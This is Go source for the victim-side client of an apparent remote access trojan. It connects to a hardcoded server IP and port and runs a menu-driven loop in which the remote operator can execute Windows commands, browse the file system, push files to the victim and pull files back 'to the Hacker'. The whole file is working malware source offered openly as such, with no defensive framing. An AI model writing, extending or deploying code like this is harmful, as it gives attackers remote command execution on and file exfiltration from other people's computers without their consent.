package main

import (
	"VictimFinalVersion/core/Download"
	"VictimFinalVersion/core/ExecuteSystemCommandWindows"
	"VictimFinalVersion/core/Move"
	"VictimFinalVersion/core/handleConnection"
	"VictimFinalVersion/core/upload"
	"bufio"
	"fmt"
	"log"
	"strings"
)


func DisplayError(err error){
	if err != nil{
		fmt.Println(err)
	}
}


func main() {
	ServerIP := "192.168.0.18"
	Port := "9090"
	connection, err := handleConnection.ConnectWithServer(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Conneciton established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	loopControl := true


	for loopControl{

		user_input_raw, err := reader.ReadString('\n')
		if err != nil{
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch  {
		case user_input == "1":
			fmt.Println("[+] Executing Commands on windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)

		case user_input == "2":
			fmt.Println("[+] File system Naviagtion")

			err = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "3":
			fmt.Println("[+] Downloading File From Server/HAcker")
			err = Download.ReadFileContents(connection)
			DisplayError(err)

		case user_input == "4":
			fmt.Println("[+] Uploading File to the Hacker")
			err = upload.Upload2Hacker(connection)

			DisplayError(err)
		case user_input == "99":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid input , try agian")
		}



	}



}